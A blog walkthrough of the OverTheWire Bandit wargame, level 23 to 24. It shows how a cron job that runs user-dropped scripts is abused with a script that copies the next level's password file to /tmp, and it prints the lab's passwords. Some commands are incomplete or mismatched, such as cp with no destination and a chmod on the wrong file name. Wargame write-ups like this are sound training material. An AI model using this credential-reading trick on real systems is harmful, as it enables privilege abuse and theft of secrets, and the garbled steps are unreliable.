<!doctype html>
<html>
  <head>
  <meta charset="utf-8">
  <title>Level 23 To 24</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
  <link rel="stylesheet" href="/assets/css/styles.css">
</head>

<!-- Insert google analytics here -->
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-6G08EX2H2Q"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-6G08EX2H2Q');
</script>

  <body>

      <nav class="navbar navbar-expand-lg bg-body-tertiary">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">OTW</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <!-- <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="#">Home</a>
        </li> -->
        
        <li class="nav-item">
          <a class ="nav-link" href="/" >home</a>
        </li>
        
        <li class="nav-item">
          <a class ="nav-link" href="/about.html" >about</a>
        </li>
        
        <li class="nav-item">
          <a class ="nav-link" href="/blog.html" >blog</a>
        </li>
        
        <!-- <li class="nav-item dropdown">
          <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
            Dropdown
          </a>
          <ul class="dropdown-menu">
            <li><a class="dropdown-item" href="#">Action</a></li>
            <li><a class="dropdown-item" href="#">Another action</a></li>
            <li><hr class="dropdown-divider"></li>
            <li><a class="dropdown-item" href="#">Something else here</a></li>
          </ul>
        </li> -->
        <!-- <li class="nav-item">
          <a class="nav-link disabled">Disabled</a>
        </li> -->
      </ul>
      <form class="d-flex" role="search">
        <input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
        <button class="btn btn-outline-success" type="submit">Search</button>
      </form>
    </div>
  </div>
</nav>


    <div class="container">
      <div class="row">
            <div class="col">
              <h1>Level 23 To 24</h1>
<p>02 May 2022 - mike</p>

<h3 id="level-23---24">Level 23 -&gt; 24</h3>
<h4 id="game-instructions">Game Instructions</h4>
<blockquote>
  <p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>
</blockquote>

<blockquote>
  <p>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>
</blockquote>

<blockquote>
  <p>NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…</p>
</blockquote>

<p>This one looks a bit similar to the previous 2 levels… Let’s dig in!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -p 2220 bandit23@bandit.labs.overthewire.org
password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
</code></pre></div></div>

<p>As the hint says: We need to investigate the <code class="language-plaintext highlighter-rouge">/etc/cron.d</code> file to see what is happening:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nv">myname</span><span class="o">=</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span>
<span class="nb">cd</span> /var/spool/<span class="nv">$myname</span>
<span class="nb">echo</span> <span class="s2">"Executing and deleting all scripts in /var/spool/</span><span class="nv">$myname</span><span class="s2">:"</span>
<span class="k">for </span>i <span class="k">in</span> <span class="k">*</span> .<span class="k">*</span><span class="p">;</span>
<span class="k">do
    if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"."</span> <span class="nt">-a</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">".."</span> <span class="o">]</span><span class="p">;</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Handling </span><span class="nv">$i</span><span class="s2">"</span>
        <span class="nb">timeout</span> <span class="nt">-s</span> 9 60 ./<span class="nv">$i</span>
        <span class="nb">rm</span> <span class="nt">-f</span> ./<span class="nv">$i</span>
    <span class="k">fi
done</span>
</code></pre></div></div>

<p>We can see that the file is systematically (every 60 sceonds) running every script <strong>as root</strong> in the <code class="language-plaintext highlighter-rouge">/var/spool/$myname</code> directory and immediately deleting the file after executing.</p>

<p>Because the script is being run as root, we can exploit this if we can manage to get a script in the <code class="language-plaintext highlighter-rouge">/var/spool/bandit24</code> directory that spits on the password.
First, let’s create a directory to do some work in:
<code class="language-plaintext highlighter-rouge">mkdir /tmp/myfancydirectory</code>
And a file that the password will be copied to:
<code class="language-plaintext highlighter-rouge">touch /tmp/myfancydirectory/thisisthepassword</code>
Next, let’s whip up a simple script:
<code class="language-plaintext highlighter-rouge">nano istealyourpass.sh</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

cat /etc/bandit_pass24 &gt; /tmp/myfancydirectory/thisisthepassword
</code></pre></div></div>
<p>This will copy the password to a file called <code class="language-plaintext highlighter-rouge">thisisthepassword</code>
Let’s <code class="language-plaintext highlighter-rouge">chmod</code> it so the script can execute it
<code class="language-plaintext highlighter-rouge">chmod 777 /tmp/myfancydirectory/istealyourpass</code>
Now let’s quickly copy the file to the <code class="language-plaintext highlighter-rouge">/var/spool/bandit24</code> directory so it can be picked up
<code class="language-plaintext highlighter-rouge">cp /tmp/myfancydirectory/istealyourpass</code>
And we wait for it to run.
After a little bit we check the directory and bam we have the password:
New password: <code class="language-plaintext highlighter-rouge">UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</code></p>



<div class="post-nav">
  <div>
    
      <a href="/2022/04/30/level-22-to-23.html">
        <span class="unsighted">Previous post:</span>
        <span aria-hidden="true">&laquo;</span>
        Level 22 To 23
      </a>
    
  </div>
  <div class="post-nav-next">
    
    
    
    
    
    <a href="/2022/05/03/level-24-to-25.html">
      <span class="unsighted">Next post:</span>
      Level 24 To
      <span style="white-space: nowrap;">
      25
      <span aria-hidden="true">&raquo;</span>
      </span>
    </a>
    
  </div>
</div>

            </div>
        <div class="col">
          <div class="card">
            <div class="card-body">
              <div class="container">
<p>Sidebar</p>

<h4>Bandit</h4>
<ul>


  <li>
    <a href="/2022/05/30/level-32-to-33.html">Level 32 To 33</a>
  </li>


  <li>
    <a href="/2022/05/28/level-31-to-32.html">Level 31 To 32</a>
  </li>


  <li>
    <a href="/2022/05/25/level-30-to-31.html">Level 30 To 31</a>
  </li>


  <li>
    <a href="/2022/05/22/level-29-to-30.html">Level 29 To 30</a>
  </li>


  <li>
    <a href="/2022/05/15/level-28-to-29.html">Level 28 To 29</a>
  </li>


  <li>
    <a href="/2022/05/13/level-27-to-28.html">Level 27 To 28</a>
  </li>


  <li>
    <a href="/2022/05/12/level-26-tp-27.html">Level 26 Tp 27</a>
  </li>


  <li>
    <a href="/2022/05/11/level-25-to-26.html">Level 25 To 26</a>
  </li>


  <li>
    <a href="/2022/05/03/level-24-to-25.html">Level 24 To 25</a>
  </li>


  <li>
    <a href="/2022/05/02/level-23-to-24.html">Level 23 To 24</a>
  </li>


  <li>
    <a href="/2022/04/30/level-22-to-23.html">Level 22 To 23</a>
  </li>


  <li>
    <a href="/2022/04/27/level-21-to-22.html">Level 21 To 22</a>
  </li>


  <li>
    <a href="/2022/04/25/level-20-to-21.html">Level 20 To 21</a>
  </li>


  <li>
    <a href="/2022/04/22/leve-19-to-20.html">Leve 19 To 20</a>
  </li>


  <li>
    <a href="/2022/04/15/level-18-to-19.html">Level 18 To 19</a>
  </li>


  <li>
    <a href="/2022/04/11/level-17-to-18.html">Level 17 To 18</a>
  </li>


  <li>
    <a href="/2022/04/09/level-16-to-17.html">Level 16 To 17</a>
  </li>


  <li>
    <a href="/2022/04/07/level-15-to-16.html">Level 15 To 16</a>
  </li>


  <li>
    <a href="/2022/04/05/level-14-to-15.html">Level 14 To 15</a>
  </li>


  <li>
    <a href="/2022/04/04/level-13-to-14.html">Level 13 To 14</a>
  </li>


  <li>
    <a href="/2022/04/03/level-12-to-13.html">Level 12 To 13</a>
  </li>


  <li>
    <a href="/2022/04/02/level-11-to-12.html">Level 11 To 12</a>
  </li>


  <li>
    <a href="/2022/03/21/level-10-to-11.html">Level 10 To 11</a>
  </li>


  <li>
    <a href="/2022/03/20/level-9-to-10.html">Level 9 To 10</a>
  </li>


  <li>
    <a href="/2022/03/18/level-8-to-9.html">Level 8 To 9</a>
  </li>


  <li>
    <a href="/2022/03/17/level-7-to-8.html">Level 7 To 8</a>
  </li>


  <li>
    <a href="/2022/03/16/level-6-to-7.html">Level 6 To 7</a>
  </li>


  <li>
    <a href="/2022/03/15/level-5-to-6.html">Level 5 To 6</a>
  </li>


  <li>
    <a href="/2022/03/13/level-4-to-5.html">Level 4 To 5</a>
  </li>


  <li>
    <a href="/2022/03/11/level-3-to-4.html">Level 3 To 4</a>
  </li>


  <li>
    <a href="/2022/03/03/level-2-to-3.html">Level 2 To 3</a>
  </li>


  <li>
    <a href="/2022/03/01/level-1-to-2.html">Level 1 To 2</a>
  </li>


  <li>
    <a href="/2022/02/12/level-0-to-1.html">Level 0 To 1</a>
  </li>


  <li>
    <a href="/2022/02/01/level-0.html">Level 0</a>
  </li>

</ul>
</div>

            </div>
          </div>
        </div>
      </div>
    </div>
  <p>footer</p>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>

  </body>
</html>
